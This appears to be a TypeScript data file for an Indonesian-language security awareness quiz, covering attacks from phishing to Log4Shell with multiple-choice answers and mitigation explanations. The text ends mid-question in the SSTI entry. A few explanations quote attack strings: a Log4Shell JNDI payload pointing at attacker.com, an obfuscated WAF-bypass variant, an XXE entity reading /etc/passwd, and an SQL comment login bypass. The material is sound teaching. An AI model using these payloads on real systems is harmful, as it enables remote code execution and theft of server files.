export interface QuizQuestion {
  q: string;
  options: string[];
  correct: number;
  explain: string;
}

export const QUIZ: Record<string, QuizQuestion[]> = {
  phishing: [
    {
      q: 'Apa teknik psikologi utama yang digunakan dalam serangan phishing?',
      options: ['Urgency, Fear, Authority', 'Logic dan rasionalitas', 'Kejenuhan dan kebosanan', 'Hanya rasa ingin tahu'],
      correct: 0,
      explain: 'Phishing menggunakan urgency ("24 jam!"), fear ("akun dihapus!"), dan authority ("CEO meminta") untuk memaksa korban bertindak cepat tanpa berpikir.',
    },
    {
      q: 'Apa itu typosquatting dalam konteks phishing?',
      options: ['Domain mirip dengan salah ejaan kecil (paypa1.com)', 'Enkripsi email yang rusak', 'Teknik pengiriman virus via USB', 'Serangan terhadap database'],
      correct: 0,
      explain: 'Typosquatting menggunakan domain dengan perbedaan kecil seperti "paypa1.com" vs "paypal.com" untuk menipu korban yang tidak teliti.',
    },
    {
      q: 'Mengapa gembok SSL (https) tidak menjamin sebuah website aman dari phishing?',
      options: ['Certificate SSL gratis tersedia untuk siapa saja', 'SSL sudah tidak digunakan lagi', 'Hanya website bank yang bisa pakai SSL', 'Browser tidak mendukung SSL'],
      correct: 0,
      explain: 'Let\'s Encrypt menyediakan SSL gratis, sehingga attacker dapat memasang gembok hijau di website phishing mereka agar terlihat terpercaya.',
    },
  ],
  ransomware: [
    {
      q: 'Apa yang dimaksud "double extortion" dalam ransomware modern?',
      options: ['Curi data SEBELUM enkripsi, lalu ancam publikasi jika tidak bayar', 'Enkripsi dua kali menggunakan dua algoritma', 'Minta tebusan dua kali', 'Menyerang dua perusahaan sekaligus'],
      correct: 0,
      explain: 'Double extortion: ransomware modern tidak hanya mengenkripsi data tetapi juga mencuri data terlebih dahulu dan mengancam akan mempublikasikannya di darkweb jika tebusan tidak dibayar.',
    },
    {
      q: 'Mengapa Volume Shadow Copies dihapus saat serangan ransomware?',
      options: ['Untuk mencegah korban restore data tanpa membayar tebusan', 'Untuk mempercepat enkripsi', 'Karena shadow copies menggunakan CPU terlalu banyak', 'Karena shadow copies berisi malware lain'],
      correct: 0,
      explain: 'VSS (Volume Shadow Service) menyimpan snapshot Windows yang bisa digunakan untuk recovery. Ransomware menghapusnya agar korban tidak bisa restore data tanpa kunci dekripsi.',
    },
    {
      q: 'Algoritma enkripsi apa yang biasa digunakan ransomware modern?',
      options: ['AES-256 (file) + RSA-2048 (kunci AES)', 'MD5 (cepat dan mudah)', 'Base64 encoding', 'Caesar cipher'],
      correct: 0,
      explain: 'Ransomware menggunakan AES-256 untuk enkripsi file (cepat) dan RSA-2048 untuk melindungi kunci AES. Tanpa private key RSA attacker, dekripsi praktis mustahil.',
    },
  ],
  sqli: [
    {
      q: 'Apa yang membuat SQL Injection bisa terjadi?',
      options: ['Input user diteruskan ke database tanpa sanitasi', 'Database tidak terenkripsi', 'Password database terlalu lemah', 'Server tidak menggunakan HTTPS'],
      correct: 0,
      explain: 'SQLi terjadi ketika input user langsung digabungkan ke SQL query tanpa parameterization, sehingga attacker bisa menyisipkan perintah SQL berbahaya.',
    },
    {
      q: 'Apa arti karakter "--" dalam SQL injection?',
      options: ['Mengkomentar sisa query asli', 'Akhir dari query', 'Operator pembanding', 'Escape character'],
      correct: 0,
      explain: 'Dalam SQL, "--" memulai komentar yang mengabaikan semua teks setelahnya. Contoh: "admin\'--" membuat query mengabaikan pengecekan password.',
    },
    {
      q: 'Metode paling efektif mencegah SQL Injection adalah?',
      options: ['Parameterized queries / Prepared Statements', 'Mengubah nama tabel database', 'Menggunakan password yang kuat', 'Mematikan logging SQL'],
      correct: 0,
      explain: 'Parameterized queries memisahkan kode SQL dari data, sehingga input user tidak bisa diinterpretasikan sebagai perintah SQL. Ini adalah solusi definitif untuk SQLi.',
    },
  ],
  ddos: [
    {
      q: 'Apa keunggulan amplification attack dalam DDoS?',
      options: ['Request kecil menghasilkan respons sangat besar (amplifikasi hingga 51.000x)', 'Lebih sulit dideteksi', 'Tidak membutuhkan botnet', 'Hanya membutuhkan satu komputer'],
      correct: 0,
      explain: 'Memcached amplification mencapai 51.000x: attacker mengirim 64 byte, server publik mengirimkan 3.2 MB ke target. Ini membuat DDoS masif mungkin dengan bandwidth minimal.',
    },
    {
      q: 'Apa itu "SYN Flood" dalam konteks DDoS?',
      options: ['Menghabiskan connection table server dengan half-open TCP connections', 'Menyerang server DNS', 'Mengirim file berukuran sangat besar', 'Brute force password server'],
      correct: 0,
      explain: 'SYN Flood mengirim jutaan paket SYN (awal TCP handshake) tanpa menyelesaikannya. Server mengalokasikan resource untuk setiap SYN, hingga connection table penuh dan koneksi baru gagal.',
    },
    {
      q: 'Mengapa DDoS dari botnet lebih berbahaya dari serangan tunggal?',
      options: ['Sumber traffic dari ribuan IP berbeda, sulit diblokir', 'Lebih mudah dilakukan', 'Traffic lebih lambat', 'Hanya memerlukan satu server'],
      correct: 0,
      explain: 'Botnet mendistribusikan serangan dari ribuan IP berbeda di seluruh dunia, membuat IP blocking tidak efektif. Solusi butuh analisis traffic pattern, bukan sekedar blokir IP.',
    },
  ],
  mitm: [
    {
      q: 'Apa itu ARP Spoofing dalam serangan MITM?',
      options: ['Mengirim ARP Reply palsu agar traffic melewati mesin attacker', 'Menyerang server DNS', 'Memalsukan sertifikat SSL', 'Memasang keylogger di router'],
      correct: 0,
      explain: 'ARP Spoofing meracuni ARP cache target dengan mengklaim MAC attacker sebagai default gateway, sehingga semua traffic jaringan melewati mesin attacker.',
    },
    {
      q: 'Apa itu SSL Stripping?',
      options: ['Downgrade koneksi HTTPS ke HTTP antara korban dan attacker', 'Mencuri certificate SSL', 'Membuat certificate SSL palsu', 'Mematikan HTTPS di server'],
      correct: 0,
      explain: 'SSL Stripping: korban berkomunikasi via HTTP ke attacker (plaintext), sementara attacker tetap terhubung via HTTPS ke server. Korban tidak mendapat enkripsi meskipun website sebenarnya HTTPS.',
    },
    {
      q: 'Proteksi paling efektif terhadap MITM di jaringan publik adalah?',
      options: ['Menggunakan VPN yang tepercaya', 'Menggunakan browser terbaru', 'Mematikan WiFi dan pakai data seluler', 'Menggunakan password yang kuat'],
      correct: 0,
      explain: 'VPN mengenkripsi seluruh traffic dalam tunnel terenkripsi, sehingga bahkan jika attacker berada di tengah jaringan, mereka hanya melihat data terenkripsi.',
    },
  ],
  xss: [
    {
      q: 'Apa perbedaan Stored XSS vs Reflected XSS?',
      options: ['Stored: tersimpan di database, memengaruhi semua pengunjung. Reflected: hanya memengaruhi korban yang klik link', 'Tidak ada perbedaan', 'Reflected lebih berbahaya', 'Stored hanya ada di PHP'],
      correct: 0,
      explain: 'Stored XSS menyimpan payload di database dan mengeksekusinya ke setiap pengunjung, jauh lebih berbahaya. Reflected XSS membutuhkan korban untuk mengklik link spesifik.',
    },
    {
      q: 'Mengapa flag "HttpOnly" pada cookie penting untuk mencegah XSS?',
      options: ['Mencegah JavaScript mengakses cookie via document.cookie', 'Mengenkripsi nilai cookie', 'Membatasi ukuran cookie', 'Membuat cookie expire lebih cepat'],
      correct: 0,
      explain: 'HttpOnly flag mencegah JavaScript (termasuk script XSS) mengakses cookie via document.cookie. Cookie sesi yang di-HttpOnly tidak bisa dicuri melalui XSS.',
    },
    {
      q: 'Apa itu Content Security Policy (CSP) dalam konteks XSS?',
      options: ['Header HTTP yang membatasi sumber script yang boleh dieksekusi', 'Enkripsi konten halaman web', 'Pembatasan akses ke halaman admin', 'Validasi input form'],
      correct: 0,
      explain: 'CSP memungkinkan server mendeklarasikan sumber script yang diizinkan (misal: hanya dari domain sendiri). Script dari domain lain diblokir, mencegah eksekusi payload XSS injected.',
    },
  ],
  'zero-day': [
    {
      q: 'Mengapa zero-day bernilai jutaan dolar di black market?',
      options: ['Tidak ada patch yang tersedia, sehingga tidak ada pertahanan efektif', 'Mudah ditemukan oleh siapa saja', 'Hanya berfungsi di sistem tertentu', 'Pemerintah melarang penjualannya'],
      correct: 0,
      explain: 'Zero-day mengeksploitasi kerentanan yang belum diketahui vendor, artinya tidak ada patch dan tidak ada signature deteksi. Ini menjadikannya senjata siber paling berbahaya.',
    },
    {
      q: 'Apa yang dimaksud "dwell time" dalam konteks zero-day APT?',
      options: ['Waktu attacker berada dalam sistem tanpa terdeteksi', 'Waktu yang dibutuhkan untuk mengembangkan exploit', 'Waktu antara patch dan exploit', 'Durasi serangan DDoS'],
      correct: 0,
      explain: 'Dwell time rata-rata zero-day APT adalah 197 hari - hampir 7 bulan attacker beroperasi diam-diam dalam jaringan target sebelum ditemukan.',
    },
    {
      q: 'Apa mitigasi terbaik terhadap zero-day yang belum ada patch-nya?',
      options: ['Behavior-based detection (EDR) dan network anomaly detection', 'Update antivirus setiap hari', 'Matikan semua port jaringan', 'Backup data setiap jam'],
      correct: 0,
      explain: 'Karena tidak ada signature, hanya deteksi berbasis perilaku (EDR) yang bisa mendeteksi zero-day. Network anomaly detection mendeteksi traffic C2 yang tidak normal.',
    },
  ],
  'social-engineering': [
    {
      q: 'Prinsip psikologi mana yang paling sering dieksploitasi social engineer?',
      options: ['Authority, Urgency, Social Proof, Liking (Cialdini)', 'Hanya ketakutan', 'Rasa bosan', 'Kelelahan'],
      correct: 0,
      explain: 'Robert Cialdini mengidentifikasi 6 prinsip persuasi. Social engineer paling sering menggunakan Authority (pura-pura bos/IT), Urgency (harus sekarang!), dan Social Proof (yang lain sudah konfirmasi).',
    },
    {
      q: 'Apa itu "pretexting" dalam social engineering?',
      options: ['Membuat skenario/identitas palsu yang meyakinkan', 'Menyerang via email', 'Menggunakan malware', 'Hack database'],
      correct: 0,
      explain: 'Pretexting adalah membuat context/identitas palsu: pura-pura sebagai IT support, vendor, regulator. Ini membangun kepercayaan awal sebelum meminta informasi sensitif.',
    },
    {
      q: 'Mengapa social engineering sering lebih efektif dari hacking teknis?',
      options: ['Manusia adalah link terlemah - lebih mudah dimanipulasi dari sistem teknis', 'Hacking teknis sudah ketinggalan zaman', 'Social engineering tidak meninggalkan jejak', 'Semua manusia mudah dibohongi'],
      correct: 0,
      explain: 'Kevin Mitnick: "The human element is the weakest link." Sistem teknis memiliki patch, firewall, dan enkripsi. Manusia memiliki emosi, kepercayaan, dan keinginan membantu yang bisa dieksploitasi.',
    },
  ],
  'dns-spoofing': [
    {
      q: 'Mengapa DNS spoofing sangat berbahaya meskipun URL di browser tampak benar?',
      options: ['Karena resolver DNS yang terracuni mengarahkan ke server attacker tanpa user tahu', 'Karena browser tidak menampilkan URL', 'Karena SSL tidak berfungsi', 'Karena cache browser lambat'],
      correct: 0,
      explain: 'DNS spoofing meracuni resolver sehingga "bank.com" di-resolve ke IP attacker. URL di browser tetap menampilkan "bank.com" karena domain yang diminta benar, hanya destinasinya yang salah.',
    },
    {
      q: 'Apa yang dimaksud Kaminsky Attack?',
      options: ['Flood fake DNS responses dengan TXID yang diprediksi untuk meracuni cache', 'Serangan DDoS ke server DNS', 'Menghapus zona DNS', 'Enkripsi traffic DNS'],
      correct: 0,
      explain: 'Kaminsky Attack (2008) mengeksploitasi prediktabilitas Transaction ID DNS. Attacker membanjiri resolver dengan respons palsu berisi "glue record" berbahaya sebelum respons asli tiba.',
    },
    {
      q: 'Apa solusi terbaik untuk mencegah DNS Spoofing?',
      options: ['DNSSEC (DNS Security Extensions)', 'Ganti password DNS server', 'Matikan cache DNS', 'Gunakan port berbeda'],
      correct: 0,
      explain: 'DNSSEC menambahkan tanda tangan kriptografi ke respons DNS, memungkinkan resolver memverifikasi bahwa respons datang dari nameserver asli dan tidak dimodifikasi.',
    },
  ],
  'supply-chain': [
    {
      q: 'Mengapa supply chain attack sangat berbahaya dibanding serangan langsung?',
      options: ['Satu kompromi vendor menginfeksi ribuan organisasi sekaligus melalui update tepercaya', 'Lebih murah dilakukan', 'Tidak memerlukan keahlian teknis', 'Lebih cepat dari brute force'],
      correct: 0,
      explain: 'SolarWinds: menginfeksi vendor → 18,000 pelanggan terinfeksi otomatis via update resmi yang ditandatangani. Skala dan kepercayaan adalah yang membuatnya sangat berbahaya.',
    },
    {
      q: 'Bagaimana SUNBURST backdoor menghindari deteksi sandbox?',
      options: ['Dormant 12-14 hari sebelum aktivasi, menyerupai kode legitimate', 'Menggunakan enkripsi kuat', 'Mematikan antivirus', 'Menghapus log sistem'],
      correct: 0,
      explain: 'SUNBURST menunggu 12-14 hari setelah instalasi (sandbox biasanya hanya menjalankan 1-5 menit), kemudian berkomunikasi via domain DGA yang tampak legitimate (*.avsvmcloud.com).',
    },
    {
      q: 'Apa itu SBOM dan mengapa penting untuk mitigasi supply chain attack?',
      options: ['Software Bill of Materials: daftar semua komponen dan dependensi software', 'Security Breach Operations Manager', 'System Backup and Operations Manual', 'Secure Boot Operations Module'],
      correct: 0,
      explain: 'SBOM adalah inventaris lengkap semua komponen software (library, dependencies, versi). Dengan SBOM, organisasi dapat dengan cepat mengidentifikasi apakah mereka terpengaruh ketika kerentanan supply chain ditemukan.',
    },
  ],
  'insider-threat': [
    {
      q: 'Mengapa insider threat lebih sulit dideteksi dibanding serangan eksternal?',
      options: ['Aktivitas mereka terlihat seperti pekerjaan normal menggunakan akses legitimate', 'Insider tidak menggunakan komputer', 'Insider tidak meninggalkan jejak apapun', 'Sistem tidak memantau user internal'],
      correct: 0,
      explain: 'Insider menggunakan akses yang memang mereka miliki. Query database, akses file, transfer email - semua terlihat normal. Hanya analisis perilaku (UBA) yang bisa mendeteksi anomali.',
    },
    {
      q: 'Apa strategi "slow exfiltration" yang digunakan insider threat?',
      options: ['Mengambil sedikit data setiap kali untuk menghindari threshold alert DLP', 'Exfiltrate semuanya sekaligus dengan cepat', 'Menggunakan USB setiap hari', 'Mengirim via email perusahaan'],
      correct: 0,
      explain: 'DLP alert biasanya terpicu di atas threshold tertentu (misal: 1000 records). Insider mengambil 500 records setiap beberapa hari, selalu di bawah threshold, sehingga tidak pernah terpicu.',
    },
    {
      q: 'Apa kontrol terbaik untuk mencegah insider threat mengeksfiltrasi data?',
      options: ['User Behavior Analytics (UBA) + Data Loss Prevention (DLP) + Least Privilege', 'Memecat semua karyawan berisiko', 'Memantau semua email secara manual', 'Menonaktifkan internet untuk semua karyawan'],
      correct: 0,
      explain: 'Kombinasi UBA (deteksi anomali perilaku), DLP (cegah transfer data sensitif), dan Least Privilege (batasi akses ke yang diperlukan saja) adalah trilogi pertahanan insider threat.',
    },
  ],
  'credential-stuffing': [
    {
      q: 'Mengapa credential stuffing sangat efektif meskipun success rate hanya 0.1-2%?',
      options: ['Karena 0.1% dari 2 miliar credential = 2 juta akun yang berhasil dikompromis', 'Karena 2% sudah cukup', 'Karena tidak memerlukan teknik apapun', 'Karena semua orang memakai password sama'],
      correct: 0,
      explain: 'Math sederhana: 2 miliar credential × 0.1% success = 2 juta akun. Dan 65% orang reuse password, sehingga satu breach memungkinkan serangan massal ke ratusan layanan lain.',
    },
    {
      q: 'Apa yang membuat credential stuffing berbeda dari brute force biasa?',
      options: ['Menggunakan credential nyata dari breach sebelumnya, bukan kombinasi acak', 'Lebih lambat dari brute force', 'Hanya menyerang satu layanan', 'Membutuhkan akses fisik'],
      correct: 0,
      explain: 'Brute force mencoba kombinasi acak (sangat lambat). Credential stuffing menggunakan username:password yang sudah terbukti valid dari breach sebelumnya, jauh lebih efisien.',
    },
    {
      q: 'Solusi paling efektif mencegah credential stuffing adalah?',
      options: ['Multi-Factor Authentication (MFA)', 'Password yang lebih panjang', 'CAPTCHA saja', 'Mengubah username'],
      correct: 0,
      explain: 'MFA membuat credential curian tidak cukup untuk login. Bahkan jika attacker punya username dan password yang benar, mereka masih butuh faktor kedua (OTP, hardware key) yang tidak mereka miliki.',
    },
  ],
  'cryptojacking': [
    {
      q: 'Mengapa Monero (XMR) dipilih untuk cryptojacking dibanding Bitcoin?',
      options: ['Monero menggunakan ring signature yang membuat transaksi tidak bisa dilacak', 'Monero lebih mudah di-mine dari Bitcoin', 'Monero lebih berharga dari Bitcoin', 'Monero tidak perlu wallet'],
      correct: 0,
      explain: 'Monero dirancang untuk privacy: ring signatures, stealth addresses, dan RingCT menyembunyikan pengirim, penerima, dan jumlah transaksi. Ini membuatnya ideal untuk attacker yang ingin anonim.',
    },
    {
      q: 'Bagaimana cryptojacking modern menghindari deteksi saat user membuka Task Manager?',
      options: ['Otomatis mengurangi CPU usage ke ~5% saat task manager terbuka', 'Menghapus dirinya sendiri', 'Mematikan Task Manager', 'Tidak ada cara menghindarinya'],
      correct: 0,
      explain: 'Script cryptojacking modern memantau visibilitas tab dan membuka task manager, lalu otomatis menurunkan throttle CPU usage sehingga tidak terlihat mencurigakan saat dipantau.',
    },
  ],
  'csrf': [
    {
      q: 'Mengapa browser otomatis mengirim cookie saat ada CSRF attack?',
      options: ['Browser selalu menyertakan cookie domain tujuan di semua request, terlepas dari origin', 'CSRF memhack browser', 'Cookie dikirim hanya via JavaScript', 'Browser tidak tahu perbedaan request legitimate dan berbahaya'],
      correct: 0,
      explain: 'Ini adalah fitur browser: cookie domain.com selalu dikirim ke domain.com di setiap request, tidak peduli request berasal dari evil-site.com. Tanpa SameSite attribute, CSRF menjadi mungkin.',
    },
    {
      q: 'Apa itu CSRF Token dan bagaimana cara kerjanya?',
      options: ['Token rahasia unik per sesi yang harus disertakan di setiap form POST', 'Enkripsi cookie session', 'Captcha pada setiap form', 'Limit request per menit'],
      correct: 0,
      explain: 'CSRF token adalah nilai acak yang disimpan di sesi dan harus disertakan dalam setiap permintaan yang mengubah state. Attacker dari domain lain tidak bisa membaca token ini (same-origin policy).',
    },
  ],
  'sim-swapping': [
    {
      q: 'Mengapa SMS 2FA dianggap tidak aman dibanding Authenticator App?',
      options: ['SMS dapat dicegat via SIM swap atau SS7 attack', 'SMS lebih lambat', 'Authenticator app lebih murah', 'SMS tidak bisa dikirim internasional'],
      correct: 0,
      explain: 'SMS 2FA rentan terhadap SIM swap (sosial engineering ke operator), SS7 protocol exploit (network level interception), dan malware yang mengakses SMS. Authenticator app menghasilkan OTP secara lokal tanpa network dependency.',
    },
    {
      q: 'Informasi apa yang biasanya dibutuhkan attacker untuk melakukan SIM swap?',
      options: ['Nama lengkap, tanggal lahir, last 4 SSN, nomor telepon korban', 'Hanya nomor telepon', 'Password akun telecom', 'PIN kartu SIM'],
      correct: 0,
      explain: 'Operator biasanya memverifikasi identitas via: nama, tanggal lahir, 4 digit terakhir SSN, dan riwayat tagihan. Semua informasi ini bisa didapat dari OSINT, data breach, atau social media.',
    },
  ],
  'fileless-malware': [
    {
      q: 'Mengapa fileless malware sulit dideteksi antivirus tradisional?',
      options: ['Tidak ada file di disk untuk di-scan, hanya hidup di RAM dan registry', 'Menggunakan enkripsi yang sangat kuat', 'Menyembunyikan diri di BIOS', 'Tidak terhubung ke internet'],
      correct: 0,
      explain: 'Antivirus tradisional berbasis signature - mencari file berbahaya di disk. Fileless malware hanya ada di memori dan registry, tidak ada file untuk di-scan sehingga signature-based detection tidak efektif.',
    },
    {
      q: 'Apa itu "Living off the Land" dalam konteks fileless malware?',
      options: ['Menggunakan tools bawaan Windows (PowerShell, WMI, certutil) untuk serangan', 'Menyimpan malware di folder system Windows', 'Menggunakan file system tipe khusus', 'Memanfaatkan hardware untuk menyimpan malware'],
      correct: 0,
      explain: 'LOLBins (Living off the Land Binaries): attacker menggunakan tools sah yang sudah ada di Windows seperti PowerShell, certutil, mshta. Karena tools ini trusted, aktivitas tampak legitimate dan susah dideteksi.',
    },
  ],
  'log4shell': [
    {
      q: 'Mengapa Log4Shell (CVE-2021-44228) mendapat skor CVSS 10.0 (tertinggi)?',
      options: ['RCE tanpa autentikasi, trivial untuk dieksploitasi, memengaruhi miliaran sistem', 'Karena ditemukan oleh peneliti terkenal', 'Karena mempengaruhi Windows saja', 'Karena sulit di-patch'],
      correct: 0,
      explain: 'CVSS 10.0 karena: Remote Code Execution (dampak tertinggi), tidak perlu autentikasi, trivial untuk dieksploitasi (hanya satu baris text), scope berubah (pivot ke server lain), dan memengaruhi hampir semua software Java.',
    },
    {
      q: 'Bagaimana Log4Shell bekerja melalui protokol JNDI?',
      options: ['Log4j mem-lookup dan mengeksekusi objek Java dari server remote melalui LDAP/RMI', 'Menginjeksi SQL ke database', 'Mengeksploitasi buffer overflow di JVM', 'Mencuri file konfigurasi Java'],
      correct: 0,
      explain: 'JNDI (Java Naming and Directory Interface) digunakan Log4j untuk referensi eksternal. Payload ${jndi:ldap://attacker.com/exploit} memaksa Log4j mengambil dan mengeksekusi kelas Java dari server attacker.',
    },
    {
      q: 'Mengapa memfilter string "${jndi:" di WAF tidak cukup untuk mencegah Log4Shell?',
      options: ['Attacker bisa obfuskasi payload: ${${::-j}${::-n}${::-d}${::-i}:...}', 'WAF tidak bisa membaca request HTTP', 'Log4j tidak menggunakan JNDI', 'Filter hanya bekerja di mode debug'],
      correct: 0,
      explain: 'Log4j mendukung nested lookups sehingga ${::-j} di-evaluate menjadi "j". Attacker bisa obfuskasi payload ratusan cara berbeda untuk bypass filter sederhana. Solusi hanya patch atau disable JNDI lookups.',
    },
  ],
  'oauth-bypass': [
    {
      q: 'Apa itu "implicit grant flow" dan mengapa dianggap tidak aman?',
      options: ['Token akses dikembalikan langsung di URL fragment, rentan dicuri via referrer', 'Flow OAuth yang paling aman', 'Digunakan hanya untuk mobile apps', 'Memerlukan client secret'],
      correct: 0,
      explain: 'Implicit flow mengembalikan access token langsung di URL (misal: #access_token=...). Token bisa bocor via referrer header, browser history, atau JavaScript. Digantikan PKCE untuk public clients.',
    },
    {
      q: 'Apa yang dimaksud "state parameter" dalam OAuth dan mengapa penting?',
      options: ['Nilai acak untuk mencegah CSRF attack pada OAuth callback', 'Status koneksi OAuth server', 'Versi OAuth yang digunakan', 'Izin yang diminta aplikasi'],
      correct: 0,
      explain: 'State parameter adalah nilai random yang dikirim saat OAuth redirect dan harus dikembalikan di callback. Tanpanya, attacker bisa melakukan CSRF: memaksa korban mengautentikasi dengan akun attacker (account linking attack).',
    },
  ],
  'jwt-attack': [
    {
      q: 'Apa itu serangan "alg:none" pada JWT?',
      options: ['Mengubah algoritma ke "none" untuk membuat signature selalu valid tanpa secret', 'Menghapus algoritma dari header', 'Menggunakan algoritma enkripsi berbeda', 'Mencuri private key signing'],
      correct: 0,
      explain: 'Beberapa JWT library menerima token dengan "alg":"none" (tanpa signature). Attacker bisa memodifikasi payload (misal: role dari "user" ke "admin"), lalu menghapus signature. Library rentan menerima token ini sebagai valid.',
    },
    {
      q: 'Apa perbedaan JWT HS256 vs RS256 dan implikasinya untuk keamanan?',
      options: ['HS256: symmetric (sama key untuk sign & verify). RS256: asymmetric (private key sign, public key verify)', 'HS256 lebih aman dari RS256', 'RS256 tidak didukung semua bahasa', 'Keduanya identik'],
      correct: 0,
      explain: 'HS256 menggunakan satu secret key untuk sign dan verify - jika client bisa verify, mereka juga bisa sign (vulnerable jika secret bocor). RS256 memisahkan: server sign dengan private key, siapa saja verify dengan public key.',
    },
  ],
  'bec': [
    {
      q: 'Apa yang membuat BEC berbeda dari phishing biasa?',
      options: ['BEC menarget individu spesifik di posisi keuangan dengan riset mendalam, bukan massal', 'BEC menggunakan malware', 'BEC hanya via email', 'BEC lebih mudah dideteksi'],
      correct: 0,
      explain: 'BEC (Business Email Compromise) adalah spear-phishing yang sangat tertarget. Attacker mempelajari struktur organisasi, proses keuangan, dan bahasa komunikasi internal untuk menciptakan permintaan yang sangat meyakinkan.',
    },
    {
      q: 'Mengapa deepfake video/audio meningkatkan efektivitas BEC?',
      options: ['Korban mendengar/melihat "suara/wajah CEO" langsung sehingga sulit meragukan keaslian', 'Deepfake tidak bisa digunakan untuk BEC', 'Video call lebih mudah diverifikasi', 'Korban selalu bisa mendeteksi deepfake'],
      correct: 0,
      explain: 'Kasus nyata: tim keuangan Hong Kong mentransfer $25 juta setelah video call dengan "CFO" deepfake. Manusia cenderung mempercayai komunikasi visual/audio lebih dari teks, bahkan ketika seharusnya mencurigai.',
    },
  ],
  'keylogger': [
    {
      q: 'Apa perbedaan software keylogger vs hardware keylogger?',
      options: ['Software: berjalan di OS (terdeteksi AV). Hardware: fisik di antara keyboard-PC (tidak terdeteksi OS)', 'Hardware keylogger lebih mudah dipasang', 'Software keylogger tidak bisa dideteksi', 'Keduanya bekerja dengan cara sama'],
      correct: 0,
      explain: 'Software keylogger berjalan sebagai proses OS dan bisa dideteksi AV/EDR. Hardware keylogger (USB passthrough device) transparan ke OS - tidak ada proses, tidak ada file, tidak ada deteksi oleh software.',
    },
    {
      q: 'Selain password, data sensitif apa lagi yang bisa dicuri keylogger?',
      options: ['Nomor kartu kredit, nomor PIN ATM, OTP banking, pesan private, konten email', 'Hanya password login', 'Hanya konten clipboard', 'Hanya data yang diketik di browser'],
      correct: 0,
      explain: 'Keylogger merekam SEMUA keystrokes - apapun yang diketik: password, nomor kartu kredit saat checkout online, PIN ATM di bank website, kode OTP, pesan di aplikasi chat, isi dokumen sensitif.',
    },
  ],
  'rootkit': [
    {
      q: 'Mengapa rootkit sangat sulit ditemukan dan dihapus?',
      options: ['Rootkit berada di level lebih dalam dari OS, bisa menyembunyikan dirinya dari OS itu sendiri', 'Rootkit menggunakan enkripsi yang sangat kuat', 'Rootkit bersembunyi di RAM yang tidak bisa dibaca', 'Rootkit menonaktifkan semua tool keamanan'],
      correct: 0,
      explain: 'Kernel rootkit berjalan di ring 0 (level kernel), sama dengan OS itu sendiri. Ketika antivirus meminta kernel untuk list proses atau file, rootkit dapat intercept dan menyembunyikan dirinya dari hasil. OS sendiri "dibohongi".',
    },
    {
      q: 'Apa cara terbaik mendeteksi rootkit yang sudah terinstall?',
      options: ['Boot dari media eksternal bersih dan scan dari OS yang tidak terinfeksi', 'Scan dengan antivirus biasa', 'Restart komputer', 'Update OS ke versi terbaru'],
      correct: 0,
      explain: 'Karena rootkit dapat memanipulasi OS yang terinfeksi, satu-satunya cara deteksi yang andal adalah boot dari media eksternal (USB/CD bootable) yang bersih dan scan sistem dari lingkungan yang tidak dikompromis.',
    },
  ],
  'dependency-confusion': [
    {
      q: 'Bagaimana dependency confusion attack bekerja?',
      options: ['Publish paket publik dengan nama sama seperti paket internal privat, package manager pilih versi lebih tinggi', 'Mengubah kode di repository privat', 'Serangan DDoS ke package registry', 'Mencuri API key npm'],
      correct: 0,
      explain: 'Package manager mengutamakan registry publik dan versi lebih tinggi. Attacker publish paket bernama persis seperti paket internal privat dengan versi lebih tinggi ke npm/PyPI. Build system otomatis mengunduh versi "baru" yang berbahaya.',
    },
    {
      q: 'Apa perbedaan dependency confusion vs typosquatting package?',
      options: ['Confusion: nama persis sama (memanfaatkan prioritas registry). Typosquatting: nama mirip (memanfaatkan typo)', 'Keduanya sama saja', 'Confusion lebih mudah dideteksi', 'Typosquatting tidak berbahaya'],
      correct: 0,
      explain: 'Typosquatting bergantung pada pengetikan salah (numpy vs nmupy). Dependency confusion lebih sophisticated: menggunakan nama PERSIS SAMA dengan paket internal, memanfaatkan logika resolusi package manager.',
    },
  ],
  'watering-hole': [
    {
      q: 'Mengapa watering hole attack disebut lebih sophisticated dari phishing massal?',
      options: ['Menyerang website yang dikunjungi target secara natural, tidak membutuhkan link phishing yang mencurigakan', 'Lebih mudah dieksekusi dari phishing', 'Tidak membutuhkan keahlian teknis', 'Memengaruhi lebih banyak orang'],
      correct: 0,
      explain: 'Phishing membutuhkan korban mengklik link mencurigakan (social engineering). Watering hole mengkompromis website yang biasa dikunjungi target (forum industri, portal pemasok) - korban mengakses URL yang sudah mereka percaya.',
    },
  ],
  'tailgating': [
    {
      q: 'Apa teknik sosial yang paling efektif untuk tailgating?',
      options: ['Berpura-pura membawa barang berat atau terlihat sibuk agar orang lain membukakan pintu', 'Lari cepat saat pintu terbuka', 'Memakai seragam keamanan', 'Menunggu saat gedung sepi'],
      correct: 0,
      explain: 'Orang secara sosial cenderung membantu (altruisme) dan tidak ingin konfrontasi. Seseorang yang memikul tumpukan kotak atau terlihat terburu-buru akan sering dibantu masuk tanpa dicek badge-nya.',
    },
  ],
  'qrishing': [
    {
      q: 'Mengapa QR code phishing (QRishing) lebih sulit dideteksi dari phishing URL biasa?',
      options: ['Manusia tidak bisa membaca URL yang disembunyikan dalam QR code sebelum memindai', 'QR code tidak bisa dipalsukan', 'Browser memblokir QR code berbahaya', 'Email filter mendeteksi QR code'],
      correct: 0,
      explain: 'URL dalam QR code tidak terlihat sebelum dipindai - tidak ada cara visual untuk memeriksa link. Email filter dan URL scanner sering melewatkan QR code karena hanya melihat gambar, bukan URL tersembunyi di dalamnya.',
    },
  ],
  'arp-spoofing': [
    {
      q: 'Mengapa ARP protocol rentan terhadap spoofing?',
      options: ['ARP tidak memiliki mekanisme autentikasi - siapa saja bisa klaim memiliki IP tertentu', 'ARP menggunakan enkripsi yang lemah', 'ARP server mudah di-hack', 'ARP hanya bekerja di jaringan kecil'],
      correct: 0,
      explain: 'ARP (Address Resolution Protocol) dirancang tanpa autentikasi. Setiap ARP Reply diterima dan cache diperbarui tanpa verifikasi apakah pengirim benar-benar memiliki IP/MAC tersebut. "Gratuitous ARP" bisa dimanfaatkan untuk poisoning.',
    },
  ],
  'xxe': [
    {
      q: 'Apa yang membuat XXE (XML External Entity) berbahaya?',
      options: ['Server mengambil dan mengembalikan file lokal atau melakukan request internal via entity definition', 'Hanya merusak format XML', 'Hanya memengaruhi browser', 'Serangan hanya di database'],
      correct: 0,
      explain: 'XXE memungkinkan mendefinisikan entitas yang mengambil konten dari sumber eksternal. Contoh: <!ENTITY file SYSTEM "file:///etc/passwd"> akan menyertakan isi /etc/passwd dalam respons XML, mengekspos file sensitif server.',
    },
  ],
  'ssti': [
    {
      q: 'Bagaimana SSTI (Server-Side Template Injection) berbeda dari XSS?',
